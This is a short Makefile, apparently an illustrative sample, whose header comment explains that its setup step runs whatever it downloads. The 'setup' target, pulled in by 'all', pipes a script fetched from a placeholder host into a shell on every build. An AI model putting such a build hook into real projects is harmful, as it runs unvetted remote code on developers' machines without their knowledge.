# A build that runs what it downloads.
#
# `make` is what a developer types without reading, and this recipe reaches the
# network and pipes the response into a shell on every machine that builds the
# project.

.PHONY: all setup

all: setup
	gcc -o app main.c

setup:
	curl -sSL https://updates.invalid/bootstrap.sh | sh
